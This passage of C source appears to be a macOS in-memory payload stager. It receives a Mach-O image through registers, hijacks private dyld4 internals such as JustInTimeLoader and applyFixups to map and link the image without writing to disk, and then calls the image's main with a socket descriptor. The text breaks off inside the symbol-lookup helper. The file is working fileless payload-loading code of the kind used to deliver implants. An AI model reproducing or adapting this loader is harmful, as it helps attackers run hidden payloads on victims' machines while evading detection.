/*
 * References:
 * @parchedmind
 * https://github.com/CylanceVulnResearch/osx_runbin/blob/master/run_bin.c
 *
 * @nologic
 * https://github.com/nologic/shellcc
 */

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/sysctl.h>

struct dyld_cache_header
{
  char     magic[16];
  uint32_t  mappingOffset;
  uint32_t  mappingCount;
  uint32_t  imagesOffsetOld;
  uint32_t  imagesCountOld;
  uint64_t  dyldBaseAddress;
  uint64_t  codeSignatureOffset;
  uint64_t  codeSignatureSize;
  uint64_t  slideInfoOffsetUnused;
  uint64_t  slideInfoSizeUnused;
  uint64_t  localSymbolsOffset;
  uint64_t  localSymbolsSize;
  uint8_t   uuid[16];
  uint64_t  cacheType;
  uint32_t  branchPoolsOffset;
  uint32_t  branchPoolsCount;
  uint64_t  accelerateInfoAddr;
  uint64_t  accelerateInfoSize;
  uint64_t  imagesTextOffset;
  uint64_t  imagesTextCount;
  uint64_t  patchInfoAddr;
  uint64_t  patchInfoSize;
  uint64_t  otherImageGroupAddrUnused;
  uint64_t  otherImageGroupSizeUnused;
  uint64_t  progClosuresAddr;
  uint64_t  progClosuresSize;
  uint64_t  progClosuresTrieAddr;
  uint64_t  progClosuresTrieSize;
  uint32_t  platform;
  uint32_t  formatVersion          : 8,
            dylibsExpectedOnDisk   : 1,
            simulator              : 1,
            locallyBuiltCache      : 1,
            builtFromChainedFixups : 1,
            padding                : 20;
  uint64_t  sharedRegionStart;
  uint64_t  sharedRegionSize;
  uint64_t  maxSlide;
  uint64_t  dylibsImageArrayAddr;
  uint64_t  dylibsImageArraySize;
  uint64_t  dylibsTrieAddr;
  uint64_t  dylibsTrieSize;
  uint64_t  otherImageArrayAddr;
  uint64_t  otherImageArraySize;
  uint64_t  otherTrieAddr;
  uint64_t  otherTrieSize;
  uint32_t  mappingWithSlideOffset;
  uint32_t  mappingWithSlideCount;
  uint64_t  dylibsPBLStateArrayAddrUnused;
  uint64_t  dylibsPBLSetAddr;
  uint64_t  programsPBLSetPoolAddr;
  uint64_t  programsPBLSetPoolSize;
  uint64_t  programTrieAddr;
  uint32_t  programTrieSize;
  uint32_t  osVersion;
  uint32_t  altPlatform;
  uint32_t  altOsVersion;
  uint64_t  swiftOptsOffset;
  uint64_t  swiftOptsSize;
  uint32_t  subCacheArrayOffset;
  uint32_t  subCacheArrayCount;
  uint8_t   symbolFileUUID[16];
  uint64_t  rosettaReadOnlyAddr;
  uint64_t  rosettaReadOnlySize;
  uint64_t  rosettaReadWriteAddr;
  uint64_t  rosettaReadWriteSize;
  uint32_t  imagesOffset;
  uint32_t  imagesCount;
};

struct dyld_cache_mapping_info {
  uint64_t  address;
  uint64_t  size;
  uint64_t  fileOffset;
  uint32_t  maxProt;
  uint32_t  initProt;
};

struct dyld_cache_image_info
{
  uint64_t  address;
  uint64_t  modTime;
  uint64_t  inode;
  uint32_t  pathFileOffset;
  uint32_t  pad;
};

struct shared_file_mapping
{
  uint64_t  address;
  uint64_t  size;
  uint64_t  file_offset;
  uint32_t  max_prot;
  uint32_t  init_prot;
};

struct libdyldDyld4Section {
    void*               apis;
    void*               allImageInfos;  // set by dyld to point to the dyld_all_image_infos struct
    void*               defaultVars;    // set by libdyld to have addresses of default crt globals in libdyld.dylib
    uint64_t dyldLookupFuncAddr;
};

struct diagnostics {
  void * _buffer;
};

// stored in PrebuiltLoaders and generated on the fly by JustInTimeLoaders, passed to mapSegments()
struct Region
{
    uint64_t    vmOffset     : 59,
                perms        :  3,
                isZeroFill   :  1,
                readOnlyData :  1;
    uint32_t    fileOffset;
    uint32_t    fileSize;       // mach-o files are limited to 4GB, but zero fill data can be very large
};

struct ArrayOfRegions
{
  struct Region* _elements;
  uintptr_t   _allocCount;
  uintptr_t   _usedCount;
};

struct ArrayOfLoaderPointers
{
  void** _elements;
  uintptr_t _allocCount;
  uintptr_t _usedCount;
};

struct FileID
{
  uint64_t        iNode;
  uint64_t        modTime;
  bool            isValid;
};

struct LoadChain
{
    const void*   previous;
    const void*      image;
};

struct LoadOptions;
typedef const void* (^Finder)(void * diag, uint64_t, const char* loadPath, const struct LoadOptions* options);
typedef void          (^Missing)(const char* pathNotFound);
struct LoadOptions
{
    bool        launching;//           = false;
    bool        staticLinkage;//       = false;    // did this path come from an LC_LOAD_DYLIB (as opposed to top level dlopen)
    bool        canBeMissing;//        = false;
    bool        rtldLocal;//           = false;
    bool        rtldNoDelete;//        = false;
    bool        rtldNoLoad;//          = false;
    bool        insertedDylib;//       = false;
    bool        canBeDylib;//          = false;
    bool        canBeBundle;//         = false;
    bool        canBeExecutable;//     = false;
    bool        forceUnloadable;//     = false;
    bool        useFallBackPaths;//    = true;
    struct LoadChain*  rpathStack;//          = nullptr;
    Finder      finder;//              = nullptr;
    Missing     pathNotFoundHandler;// = nullptr;
};

struct Loaded {
  void* _allocator;//           = nullptr;
  void* * elements;//             = nullptr;
  size_t size;//                    = 0;
  size_t capacity;//                = 0;
};

struct PartialLoader {
  const uint32_t      magic;                    // kMagic
  const uint16_t      isPrebuilt         :  1,  // PrebuiltLoader vs JustInTimeLoader
        dylibInDyldCache   :  1,
        hasObjC            :  1,
        mayHavePlusLoad    :  1,
        hasReadOnlyData    :  1,  // __DATA_CONST
        neverUnload        :  1,  // part of launch or has non-unloadable data (e.g. objc, tlv)
        leaveMapped        :  1,  // RTLD_NODELETE
        padding2           :  8;
  const void*   mappedAddress;
  uint64_t     pathOffset         : 16,
                       dependentsSet      :  1,
                       fixUpsApplied      :  1,
                       inited             :  1,
                       hidden             :  1,
                       altInstallName     :  1,
                       lateLeaveMapped    :  1,
                       overridesCache     :  1,
                       allDepsAreNormal   :  1,
                       overrideIndex      : 15,
                       depCount           : 16,
                       padding            :  9;
  uint64_t             sliceOffset;
  struct FileID               fileIdent;
  const void*    overridePatches;
  const void*    overridePatchesCatalystMacTwin;
  uint32_t             exportsTrieRuntimeOffset;
  uint32_t             exportsTrieSize;
  void*                dependents[1];
};

struct DyldCacheDataConstLazyScopedWriter {
  void **  _state;
  bool   _wasMadeWritable;
};

typedef NSObjectFileImageReturnCode (*NSCreateObjectFileImageFromMemory_ptr)(void *address, unsigned long size, NSObjectFileImage *objectFileImage);
typedef NSModule (*NSLinkModule_ptr)(NSObjectFileImage objectFileImage, const char* moduleName, unsigned long options);

typedef NSSymbol (*NSLookupSymbolInModule_ptr)(NSModule module, const char *symbolName);
typedef void * (*NSAddressOfSymbol_ptr)(NSSymbol symbol);

typedef /*Loader*/void * (*JustInTimeLoaderMake_ptr)(void *apis, void *ma, const char* path, const struct FileID * fileId, uint64_t sliceOffset, bool willNeverUnload, bool leaveMapped, bool overridesCache, uint16_t overridesDylibIndex);
typedef void * (*AnalyzeSegmentsLayout_ptr)(void *ma, uintptr_t * vmSpace, bool * hasZeroFill);
typedef void * (*VMAllocate_ptr)(uint64_t target_task, void * address, uint64_t size, int flags);
typedef void * (*VMDeallocate_ptr)(uint64_t target_task, void * address, uint64_t size);
typedef void * (*WithRegions_ptr)(void *ma, void * callback);
typedef void * (*MMap_ptr)(void * sdg, void *addr, size_t length, int prot, int flags, int fd, uint64_t offset);
void * memcpy2(void *dest, const void *src, size_t len);
typedef void * (*Mprotect_ptr)(void * sdg, void * dst, uint64_t length, int prot);
typedef void (*WithLoadersWriteLock_ptr)(void *apis, void * callback);
typedef void (*LoadDependents_ptr)(void *topLoader, const struct diagnostics * diag, void * apis, const struct LoadOptions * lo);
typedef void (*RunInitializers_ptr)(void *topLoader, void * apis);
typedef void (*IncDlRefCount_ptr)(void *apis, void * topLoader);
typedef void (*NotifyLoad_ptr)(void * apis, struct ArrayOfLoaderPointers * newLoaders);
typedef void (*NotifyDebuggerLoad_ptr)(void * apis, const struct ArrayOfLoaderPointers * aolp);
typedef void (*ApplyFixups_ptr)(void * ldr, const struct diagnostics * diag, void * apis, struct DyldCacheDataConstLazyScopedWriter * dcd, bool b);
typedef void (*NotifyDtrace_ptr)(void * apis, const struct ArrayOfLoaderPointers * aolp);
typedef void (*RebindMissingFlatLazySymbols_ptr)(void * apis, const struct ArrayOfLoaderPointers * aolp);
typedef void * (*GetMA_ptr)(void * ldr, void * apis);
typedef bool (*HasThreadLocalVariables_ptr)(void * ma);
typedef void (*SetUpTLVs_ptr)(void * ma, void * apis);
typedef void (*AddWeakDefs_ptr)(void * apis, void * newLoaders);

typedef uint64_t (*SimpleDPrintf_ptr)(uint64_t fd, const char * fmt, const void * a);

uint64_t find_macho(uint64_t addr, unsigned int increment);
uint64_t find_dylib(uint64_t addr, unsigned int increment);
void * find_symbol(uint64_t base, char* symbol, uint64_t offset);
int string_compare(const char* s1, const char* s2);
int detect_sierra();
uint64_t syscall_shared_region_check_np();
uint64_t roundUp(uint64_t numToRound, uint64_t multiple);

//#define DEBUG
#ifdef DEBUG
static void print(char * str);
#define printf(a,b) print(a);
#endif


#define DYLD_BASE_ADDR 0x00007fff5fc00000
#define MAX_OSXVM_ADDR 0x00007ffffffff000

int main(int argc, char** argv)
{
#ifdef DEBUG
  print("main!\n");
#endif
  uint64_t buffer = 0;
  uint64_t buffer_size = 0;
  __asm__(
      "movq %%r10, %0;\n"
      "movq %%r12, %1;\n"
      : "=g"(buffer), "=g"(buffer_size));

#ifdef DEBUG
  print("hello world!\n");
#endif

  int sierra = detect_sierra();
  uint64_t binary = DYLD_BASE_ADDR;
  uint64_t dyld;
  uint64_t offset;
  if (sierra) {
    uint64_t shared_region_start = syscall_shared_region_check_np();

    struct dyld_cache_header *header = (void*)shared_region_start;
    uint32_t imagesCount = header->imagesCountOld;
    if (imagesCount == 0) {
      imagesCount = header->imagesCount;
    }
    struct shared_file_mapping *sfm = (void*)header + header->mappingOffset;
    uint32_t imagesOffset = header->imagesOffsetOld;
    if (imagesOffset == 0) {
      imagesOffset = header->imagesOffset;
    }
    struct dyld_cache_image_info *dcimg = (void*)header + imagesOffset;
    for (size_t i=0; i < imagesCount; i++) {
      char * pathFile = (char *)shared_region_start+dcimg->pathFileOffset;
      if (string_compare(pathFile, "/usr/lib/system/libdyld.dylib") == 0) {
        dyld = dcimg->address;
        break;
      }
      dcimg++;
    }
    offset = (uint64_t)header - sfm->address;
    dyld += offset;
  } else {
    dyld = find_macho(binary, 0x1000);
    offset = dyld - DYLD_BASE_ADDR;
  }
  if (!dyld) {
    return 1;
  }

  NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = find_symbol(dyld, "_NSCreateObjectFileImageFromMemory", offset);
  while (!NSCreateObjectFileImageFromMemory_func) {
    if (sierra) {
      dyld = find_dylib(dyld + 0x1000, 0x1000);
    } else {
      dyld = find_macho(dyld + 0x1000, 0x1000);
      offset = dyld - DYLD_BASE_ADDR;
    }
    if (!dyld) {
      return 1;
    }
    NSCreateObjectFileImageFromMemory_func = find_symbol(dyld, "_NSCreateObjectFileImageFromMemory", offset);
  }
#ifdef DEBUG
  print("good symbol!\n");
#endif

  // gDyld is a special struct that libdyld.dylib uses to interface with dyld4.
  // gDyld is not present in dyld3 and back.
  void* gDyld = find_symbol(dyld, "__ZN5dyld45gDyldE", offset);
  //printf("gDyld: %lld\n", gDyld);
  void * addr_main = 0;
  if (gDyld != 0) {
#ifdef DEBUG
    print("gDyld found, using dual hijack technique.\n");
#endif
    // Also known as the RuntimeState or Allocator.
    void* apis = ((struct libdyldDyld4Section*)gDyld)->apis;
#ifdef DEBUG
    printf("apis: %lld\n", apis);
    printf("config: %i\n", (int)*(void **)(apis+8));
#endif
    // config is offset around 0x100000 from the start of dyld4.
    uint64_t base = roundUp((uint64_t)(*(void **)(apis+8) - 0x00100000), 0x1000);
#ifdef DEBUG
    printf("base: %lld\n", base);
#endif
    // sdyld will be the address of dyld4, which contains mangled symbols.
    uint64_t sdyld = find_macho(base, 0x1000);
#ifdef DEBUG
    printf("sdyld: %lld\n", sdyld);
#endif
    JustInTimeLoaderMake_ptr JustInTimeLoaderMake_func = find_symbol(sdyld, "__ZN5dyld416JustInTimeLoader4makeERNS_12RuntimeStateEPKN5dyld313MachOAnalyzerEPKcRKNS_6FileIDEybbbt", sdyld);
    while (!JustInTimeLoaderMake_func) {
      sdyld = find_macho(sdyld + 0x1000, 0x1000);
      if (sdyld == 1) {
#ifdef DEBUG
        print("failed.\n");
#endif
        return 1;
      }
      //printf("Dyld: %lld\n", sdyld);
      JustInTimeLoaderMake_func = find_symbol(sdyld, "__ZN5dyld416JustInTimeLoader4makeERNS_12RuntimeStateEPKN5dyld313MachOAnalyzerEPKcRKNS_6FileIDEybbbt", sdyld);
    }
    //printf("Errno: %i\n", *(int*)find_symbol(sdyld, "_errno", sdyld));
    //printf("JITLMP: %lld\n", JustInTimeLoaderMake_func);
    SimpleDPrintf_ptr SimpleDPrintf_func = find_symbol(sdyld, "__simple_dprintf", sdyld);
#ifdef DEBUG
    SimpleDPrintf_func(1, "SimpleDPrintf_func: %lld\n", SimpleDPrintf_func);
#endif
    // Loader::mapSegments
    uintptr_t vmSpace = 0;
    bool hasZeroFill;
    AnalyzeSegmentsLayout_ptr AnalyzeSegmentsLayout_func = find_symbol(sdyld, "__ZNK5dyld313MachOAnalyzer21analyzeSegmentsLayoutERyRb", sdyld);
#ifdef DEBUG
    print("Analyzing Segments.\n");
#endif
    *(uint32_t*)buffer = 0xfeedfacf;
#ifdef DEBUG
    SimpleDPrintf_func(1, "Buffer: %lld\n", buffer);
#endif
    AnalyzeSegmentsLayout_func((void*)buffer, &vmSpace, &hasZeroFill);
#ifdef DEBUG
    SimpleDPrintf_func(1, "vmSpace: %lld\n", vmSpace);
#endif
    bool isTranslated = false; // Rosetta.
    uint64_t extraAllocSize = 0;
    if ((*(uint64_t **)(apis + 8))[0x7c] != 0) {
      isTranslated = true;
#ifdef DEBUG
      print("Rosetta.\n");
#endif
      // TODO: Rosseta requires a bit more space...
      extraAllocSize = 0x0;
    }
    vmSpace += extraAllocSize;
#ifdef DEBUG
    SimpleDPrintf_func(1, "Translated: %s\n", isTranslated ? "true" : "false");
#endif
    uintptr_t loadAddress = 0;
    VMAllocate_ptr VMAllocate_func = find_symbol(sdyld, "_vm_allocate", sdyld);
    uint64_t mach_task_self = *(uint64_t*)find_symbol(sdyld, "_mach_task_self_", sdyld);
    void * vmallocate_ret = VMAllocate_func(mach_task_self, &loadAddress, vmSpace, /*VM_FLAGS_ANYWHERE: */0x1);
#ifdef DEBUG
    SimpleDPrintf_func(1, "VMAllocate Ret: %lld\n", vmallocate_ret);
    SimpleDPrintf_func(1, "LoadAddress: %lld\n", loadAddress);
#endif
    // Put regions together...
    // JustInTimeLoader::withRegions via MachOAnalyzer::getAllSegmentsInfos
    WithRegions_ptr WithRegions_func = find_symbol(sdyld, "__ZN5dyld416JustInTimeLoader11withRegionsEPKN5dyld313MachOAnalyzerEU13block_pointerFvRKNS1_5ArrayINS_6Loader6RegionEEEE", sdyld);
    WithRegions_func((void*)buffer, ^(struct ArrayOfRegions * rptr) {
#ifdef DEBUG
        SimpleDPrintf_func(1, "Region Ptrs: %lld\n", rptr);
        SimpleDPrintf_func(1, "usedCount: %lld\n", rptr->_usedCount);
        SimpleDPrintf_func(1, "allocCount: %lld\n", rptr->_allocCount);
#endif
        uint32_t segIndex = 0;
        uint64_t sliceOffset = 0;
        uint64_t lastOffset = 0;
        for (int i = 0 ; i < rptr->_usedCount; i++) {
          const struct Region region = rptr->_elements[i];
#ifdef DEBUG
          SimpleDPrintf_func(1, "Region vmOffset: %lld\n", region.vmOffset);
          SimpleDPrintf_func(1, "Region perms: %lld\n", region.perms);
          SimpleDPrintf_func(1, "Region isZeroFill: %lld\n", region.isZeroFill);
          SimpleDPrintf_func(1, "Region readOnlyData: %lld\n", region.readOnlyData);
          SimpleDPrintf_func(1, "Region fileOffset: %lld\n", region.fileOffset);
          SimpleDPrintf_func(1, "Region fileSize: %lld\n", region.fileSize);
          print("----\n");
#endif
          if ( region.isZeroFill || (region.fileSize == 0) )
            continue;
          if ( (region.vmOffset == 0) && (segIndex > 0) )
            continue;
          int perms = region.perms;
          MMap_ptr MMap_func = find_symbol(sdyld, "__ZNK5dyld415SyscallDelegate4mmapEPvmiiim", sdyld);
#ifdef DEBUG
          SimpleDPrintf_func(1, "Errno: %i\n", *(int*)find_symbol(sdyld, "_errno", sdyld));
          SimpleDPrintf_func(1, "Addr: %lld\n", (void*)(loadAddress + region.vmOffset));
          SimpleDPrintf_func(1, "Size: %lld\n", (size_t)region.fileSize);
          SimpleDPrintf_func(1, "Perms: %lld\n", region.perms);
          SimpleDPrintf_func(1, "Flags: %lld\n", MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS);
          SimpleDPrintf_func(1, "FD: %lld\n", (int)-1);
          SimpleDPrintf_func(1, "Offset: %lld\n", (size_t)(sliceOffset + region.fileOffset));
#endif
          // MMap will init this with zeros.
          void* segAddress = MMap_func(*(void **)(apis+ 8), (void*)(loadAddress + region.vmOffset), (size_t)region.fileSize, PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
          lastOffset = loadAddress + region.vmOffset + region.fileSize;
#ifdef DEBUG
          SimpleDPrintf_func(1, "Errno: %i\n", *(int*)find_symbol(sdyld, "_errno", sdyld));
          SimpleDPrintf_func(1, "Buffer: %lld\n", buffer);
          SimpleDPrintf_func(1, "BufferO: %lld\n", buffer + sliceOffset + region.fileOffset);
#endif
          memcpy2(segAddress, (const void *)(buffer + sliceOffset + region.fileOffset), (size_t)region.fileSize);
#ifdef DEBUG
          SimpleDPrintf_func(1, "Errno: %i\n", *(int*)find_symbol(sdyld, "_errno", sdyld));
#endif
          Mprotect_ptr Mprotect_func = find_symbol(sdyld, "__ZNK5dyld415SyscallDelegate8mprotectEPvmi", sdyld);
          Mprotect_func(*(void **)(apis+ 8), segAddress, (size_t)region.fileSize, perms);
#ifdef DEBUG
          SimpleDPrintf_func(1, "SegAddress: %lld\n", segAddress);
          SimpleDPrintf_func(1, "Errno: %i\n", *(int*)find_symbol(sdyld, "_errno", sdyld));
#endif
          ++segIndex;
        }
    });
    // Okay, we should be good to go with JustInTimeLoader::make.
    // __ZNK5dyld39MachOFile11installNameEv: ""
    WithLoadersWriteLock_ptr WithLoadersWriteLock_func = find_symbol(sdyld, "__ZN5dyld412RuntimeState20withLoadersWriteLockEU13block_pointerFvvE", sdyld);
    // We cannot use __block as it corrupts the stack, so we have to use a malloc technique to pass data.
    uintptr_t structspace = 0;
    uint64_t structspacesize = sizeof(void *)+ // rtopLoader
        sizeof(struct FileID)+ // fileid
        sizeof(struct LoadChain)+ // loadChainMain
        sizeof(struct LoadChain)+ // loadChainCaller
        sizeof(struct LoadChain)+ // loadChain
        sizeof(struct LoadOptions)+ // depOptions
        sizeof(struct diagnostics); // diag
    VMAllocate_func(mach_task_self, &structspace, structspacesize, 0x1);
    uint64_t * rtopLoader = (uint64_t *)(structspace);;
    WithLoadersWriteLock_func(apis, ^(){
      struct Loaded * loaded = (struct Loaded*)(apis+32);
      uintptr_t startLoaderCount = loaded->size;
#ifdef DEBUG
      SimpleDPrintf_func(1, "Loaded Size: %lld\n", loaded->size);
      SimpleDPrintf_func(1, "Loaded first: %lld\n", (loaded->elements));
      SimpleDPrintf_func(1, "Loaded Capacity: %lld\n", loaded->capacity);
#endif
      struct FileID * fileid = (struct FileID *)(rtopLoader+sizeof(void *));// = { 0, 0, false };
      fileid->iNode = 0;
      fileid->modTime = 0;
      fileid->isValid = false;
#ifdef DEBUG
      SimpleDPrintf_func(1, "Apis: %lld\n", apis);
      SimpleDPrintf_func(1, "LoadAddress: %lld\n", loadAddress);
      SimpleDPrintf_func(1, "JITLMP: %lld\n", JustInTimeLoaderMake_func);
#endif
      void * topLoader = JustInTimeLoaderMake_func(apis, (void *)loadAddress, "", fileid, 0, false, true, false, 0);
#ifdef DEBUG
      SimpleDPrintf_func(1, "TopLoader: %lld\n", topLoader);
      SimpleDPrintf_func(1, "Toploader (*(int*)this): %i\n", *(int *)topLoader);
      SimpleDPrintf_func(1, "Loaded Size: %lld\n", loaded->size);
      SimpleDPrintf_func(1, "Loaded Capacity: %lld\n", loaded->capacity);
#endif
      struct PartialLoader * pl = (struct PartialLoader *)topLoader;
#ifdef DEBUG
      SimpleDPrintf_func(1, "LoadAddress: %lld\n", pl->mappedAddress);
      SimpleDPrintf_func(1, "lateLeaveMapped: %lld\n", pl->lateLeaveMapped);
      SimpleDPrintf_func(1, "hidden: %lld\n", pl->hidden);
      SimpleDPrintf_func(1, "Magic: %lld\n", pl->magic);
      SimpleDPrintf_func(1, "IsPrebuilt: %lld\n", pl->isPrebuilt);
#endif
      pl->lateLeaveMapped = 1;
      pl = (struct PartialLoader *)topLoader;
#ifdef DEBUG
      SimpleDPrintf_func(1, "lateLeaveMapped: %lld\n", pl->lateLeaveMapped);
#endif
      struct LoadChain * loadChainMain = (struct LoadChain *)(fileid+sizeof(struct FileID));// = { 0, *(void **)(apis+24) };
      loadChainMain->previous = 0;
      loadChainMain->image = *(void **)(apis+24);
#ifdef DEBUG
      SimpleDPrintf_func(1, "mainExecutableLoader: %lld\n", *(void **)(apis+24));
      SimpleDPrintf_func(1, "mainExecutableLoader: %lld\n", loadChainMain->image);
#endif
      struct LoadChain * loadChainCaller = (struct LoadChain *)(loadChainMain+sizeof(struct LoadChain));// = { &loadChainMain, &(loaded->elements[0]) };
      loadChainCaller->previous = &loadChainMain;
      loadChainCaller->image = &(loaded->elements[0]);
#ifdef DEBUG
      SimpleDPrintf_func(1, "LoadedElements: %lld\n", &(loaded->elements[0]));
      SimpleDPrintf_func(1, "Toploader (*(int*)this): %i\n", *(int *)topLoader);
#endif
      struct LoadChain * loadChain = (struct LoadChain *)(loadChainCaller+sizeof(struct LoadChain));// = { &loadChainCaller, topLoader };
      loadChain->previous = &loadChainCaller;
      loadChain->image = topLoader;
      struct LoadOptions * depOptions = (struct LoadOptions *)(loadChain+sizeof(struct LoadChain));
      depOptions->staticLinkage    = false;
      depOptions->rtldLocal        = false; // RTLD_LOCAL only effects top level dylib
      depOptions->rtldNoDelete     = true;
      depOptions->canBeDylib       = true;
      depOptions->rpathStack       = loadChain;
      depOptions->useFallBackPaths = true;
      LoadDependents_ptr LoadDependents_func = find_symbol(sdyld, "__ZN5dyld46Loader14loadDependentsER11DiagnosticsRNS_12RuntimeStateERKNS0_11LoadOptionsE", sdyld);
      struct diagnostics * diag = (struct diagnostics *)(depOptions+sizeof(struct LoadOptions));
      diag->_buffer = 0;
      LoadDependents_func(topLoader, diag, apis, depOptions);
      if (diag->_buffer != 0) {
#ifdef DEBUG
        print("Error\n");
#endif
      };
#ifdef DEBUG
      SimpleDPrintf_func(1, "buffer: %lld\n", diag->_buffer);
      SimpleDPrintf_func(1, "startLoaderCount: %lld\n", startLoaderCount);
#endif
      uint64_t newLoadersCount = loaded->size - startLoaderCount;
#ifdef DEBUG
      SimpleDPrintf_func(1, "newLoadersCount: %lld\n", newLoadersCount);
#endif
      void * * newLoaders = &loaded->elements[startLoaderCount];
      struct ArrayOfLoaderPointers newLoadersArray = { newLoaders, newLoadersCount, newLoadersCount };
      if (newLoadersCount != 0) {
        NotifyDebuggerLoad_ptr NotifyDebuggerLoad_func = find_symbol(sdyld, "__ZN5dyld412RuntimeState18notifyDebuggerLoadERKN5dyld35ArrayIPKNS_6LoaderEEE", sdyld);
        NotifyDebuggerLoad_func(apis, &newLoadersArray);
        if (*(char *)(apis + 0x7f) != '\0') {
          AddWeakDefs_ptr AddWeakDefs_func = find_symbol(sdyld, "__ZN5dyld46Loader16addWeakDefsToMapERNS_12RuntimeStateERKN5dyld35ArrayIPKS0_EE", sdyld);
          AddWeakDefs_func(apis, &newLoadersArray);
#ifdef DEBUG
          print("WeakRefed\n");
#endif
        }
        ApplyFixups_ptr ApplyFixups_func = find_symbol(sdyld, "__ZNK5dyld46Loader11applyFixupsER11DiagnosticsRNS_12RuntimeStateERNS_34DyldCacheDataConstLazyScopedWriterEb", sdyld);
        struct DyldCacheDataConstLazyScopedWriter dcdclsw = { apis, false };
        for (int i = 0; i != newLoadersCount; ++i) {
#ifdef DEBUG
          print("Fixing Up!\n");
#endif
          void * ldr = newLoaders[i];
#ifdef DEBUG
          SimpleDPrintf_func(1, "Ldr: %lld\n", ldr);
#endif
          ApplyFixups_func(ldr, diag, apis, &dcdclsw, true);
#ifdef DEBUG
          SimpleDPrintf_func(1, "Diag: %lld\n", diag->_buffer);
#endif
        }
        // TODO: Figure out if we need addPermanentRanges.
        NotifyDtrace_ptr NotifyDtrace_func = find_symbol(sdyld, "__ZN5dyld412RuntimeState12notifyDtraceERKN5dyld35ArrayIPKNS_6LoaderEEE", sdyld);
        NotifyDtrace_func(apis, &newLoadersArray);
        RebindMissingFlatLazySymbols_ptr RebindMissingFlatLazySymbols_func = find_symbol(sdyld, "__ZN5dyld412RuntimeState28rebindMissingFlatLazySymbolsERKN5dyld35ArrayIPKNS_6LoaderEEE", sdyld);
        RebindMissingFlatLazySymbols_func(apis, &newLoadersArray);
        for (int i = 0; i != newLoadersCount; ++i) {
          void * ldr = newLoaders[i];
#ifdef DEBUG
          print("Setting up locals.\n");
#endif
          GetMA_ptr GetMA_func = find_symbol(sdyld, "__ZNK5dyld46Loader11loadAddressERNS_12RuntimeStateE", sdyld);
          const void* * ma = GetMA_func(ldr, apis);
          HasThreadLocalVariables_ptr HasThreadLocalVariables_func = find_symbol(sdyld, "__ZNK5dyld39MachOFile23hasThreadLocalVariablesEv", sdyld);
          if (HasThreadLocalVariables_func(ma) == true) {
#ifdef DEBUG
            print("Has local variables.\n");
#endif
            SetUpTLVs_ptr SetUpTLVs_func = find_symbol(sdyld, "__ZN5dyld412RuntimeState9setUpTLVsEPKN5dyld313MachOAnalyzerE", sdyld);
            SetUpTLVs_func(apis, ma);
          }
        };
      }
      IncDlRefCount_ptr IncDlRefCount_func = find_symbol(sdyld, "__ZN5dyld412RuntimeState13incDlRefCountEPKNS_6LoaderE", sdyld);
      IncDlRefCount_func(apis, topLoader);
#ifdef DEBUG
      print("Notifying.\n");
#endif
      NotifyLoad_ptr NotifyLoad_func = find_symbol(sdyld, "__ZN5dyld412RuntimeState10notifyLoadERKN5dyld35ArrayIPKNS_6LoaderEEE", sdyld);
      NotifyLoad_func(apis, &newLoadersArray);
#ifdef DEBUG
      print("Initializing\n");
#endif
      RunInitializers_ptr RunInitializers_func = find_symbol(sdyld, "__ZNK5dyld46Loader38runInitializersBottomUpPlusUpwardLinksERNS_12RuntimeStateE", sdyld);
      RunInitializers_func(topLoader, apis);
      *rtopLoader = (uint64_t)topLoader;
    });
    uintptr_t flags = 0;
    void* handle = (void*)((((uintptr_t)*rtopLoader) << 1) | flags);
#ifdef DEBUG
    SimpleDPrintf_func(1, "Handle: %lld\n", handle);
#endif
    VMDeallocate_ptr VMDeallocate_func = find_symbol(sdyld, "_vm_deallocate", sdyld);
    VMDeallocate_func(mach_task_self, (void *)structspace, structspacesize);
#ifdef DEBUG
    SimpleDPrintf_func(1, "VMDeallocated: %lld\n", structspace);
#endif
    NSModule nm = handle;
    NSLookupSymbolInModule_ptr NSLookupSymbolInModule_func = find_symbol(dyld, "_NSLookupSymbolInModule", offset);
    NSSymbol sym_main = NSLookupSymbolInModule_func(nm, "_main");
#ifdef DEBUG
    SimpleDPrintf_func(1, "sym_main: %lld\n", sym_main);
#endif
    NSAddressOfSymbol_ptr NSAddressOfSymbol_func = find_symbol(dyld, "_NSAddressOfSymbol", offset);
    addr_main = NSAddressOfSymbol_func(sym_main);
  } else {
    NSLinkModule_ptr NSLinkModule_func = find_symbol(dyld, "_NSLinkModule", offset);
    if (!NSLinkModule_func) {
      return 1;
    }

    NSLookupSymbolInModule_ptr NSLookupSymbolInModule_func = find_symbol(dyld, "_NSLookupSymbolInModule", offset);
    if (!NSLookupSymbolInModule_func) {
      return 1;
    }

    NSAddressOfSymbol_ptr NSAddressOfSymbol_func = find_symbol(dyld, "_NSAddressOfSymbol", offset);
    if (!NSAddressOfSymbol_func) {
      return 1;
    }

    /*if (*(char*)buffer == 'b') {*/
    /*print("magic b!\n");*/
    /*}*/
    *(char*)buffer = '\xcf';
    ((uint32_t *)buffer)[3] = MH_BUNDLE;

    NSObjectFileImage fi = 0;
    if (NSCreateObjectFileImageFromMemory_func((void*)buffer, buffer_size, &fi) != 1) {
      return 1;
    }
#ifdef DEBUG
    print("created!\n");
#endif

    NSModule nm = NSLinkModule_func(fi, "", NSLINKMODULE_OPTION_PRIVATE | NSLINKMODULE_OPTION_BINDNOW | NSLINKMODULE_OPTION_RETURN_ON_ERROR);
    if (!nm) {
#ifdef DEBUG
      print("no nm!\n");
#endif
      return 1;
    }
#ifdef DEBUG
    print("good nm!\n");
#endif

    NSSymbol sym_main = NSLookupSymbolInModule_func(nm, "_main");
    if (!sym_main) {
      return 1;
    }

    addr_main = NSAddressOfSymbol_func(sym_main);
    if (!addr_main) {
      return 1;
    }

#ifdef DEBUG
    print("found main!\n");
#endif
  };
  int(*main_func)(int, char**) = (int(*)(int, char**))addr_main;
  char* socket = (char*)(size_t)argc;
  char *new_argv[] = { "m", socket, NULL };
  int new_argc = 2;
  return main_func(new_argc, new_argv);
}

void * find_symbol(uint64_t base, char* symbol, uint64_t offset)
{
  struct segment_command_64 *sc, *linkedit, *text;
  struct load_command *lc;
  struct symtab_command *symtab;
  struct nlist_64 *nl;

  char *strtab;
  symtab = 0;
  linkedit = 0;
  text = 0;

  lc = (struct load_command *)(base + sizeof(struct mach_header_64));
  for (int i=0; i<((struct mach_header_64 *)base)->ncmds; i++) {
    if (lc->cmd == LC_SYMTAB) {
      symtab = (struct symtab_command *)lc;
